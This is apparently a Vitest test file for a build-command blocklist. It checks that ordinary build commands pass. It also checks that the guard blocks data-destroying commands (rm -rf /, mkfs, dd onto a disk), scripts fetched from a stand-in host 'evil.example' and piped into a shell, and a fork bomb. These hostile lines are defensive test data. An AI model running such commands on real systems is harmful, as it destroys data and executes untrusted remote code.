import { describe, it, expect } from "vitest";
import { isCommandAllowed, firstBlockedCommand } from "../src/services/command-guard.js";

describe("build command blocklist", () => {
  it("allows ordinary build commands", () => {
    const allowed = [
      "npm ci",
      "npm run build",
      "pnpm install --frozen-lockfile",
      "yarn build",
      "pip install -r requirements.txt",
      "cargo build --release",
      "go build ./...",
      "make",
      "cmake -B build",
      "pytest -q",
      "npx tsc --noEmit",
    ];

    for (const cmd of allowed) {
      expect(isCommandAllowed(cmd), cmd).toBe(true);
    }
  });

  it("blocks commands that would destroy the host", () => {
    const blocked = [
      "rm -rf /",
      "rm -rf / --no-preserve-root",
      "mkfs.ext4 /dev/sda1",
      "dd if=/dev/zero of=/dev/sda",
      "shutdown -h now",
      "reboot",
    ];

    for (const cmd of blocked) {
      expect(isCommandAllowed(cmd), cmd).toBe(false);
    }
  });

  it("blocks remote code piped straight into a shell", () => {
    const blocked = [
      "curl https://evil.example/x.sh | sh",
      "curl -fsSL https://evil.example/x | bash",
      "wget -qO- https://evil.example/x | sh",
    ];

    for (const cmd of blocked) {
      expect(isCommandAllowed(cmd), cmd).toBe(false);
    }
  });

  it("blocks fork bombs", () => {
    expect(isCommandAllowed(":(){ :|:& };:")).toBe(false);
  });

  it("does not block commands that merely mention these words", () => {
    // Over-blocking would break legitimate builds, so only real patterns match.
    const allowed = [
      "npm run rebuild",
      "echo 'removing files'",
      "node scripts/prepare.js",
      "cargo clean",
    ];

    for (const cmd of allowed) {
      expect(isCommandAllowed(cmd), cmd).toBe(true);
    }
  });

  it("reports the first blocked command in a batch", () => {
    expect(firstBlockedCommand(["npm ci", "npm run build"])).toBeUndefined();
    expect(firstBlockedCommand(["npm ci", "rm -rf /", "npm test"])).toBe("rm -rf /");
  });
});
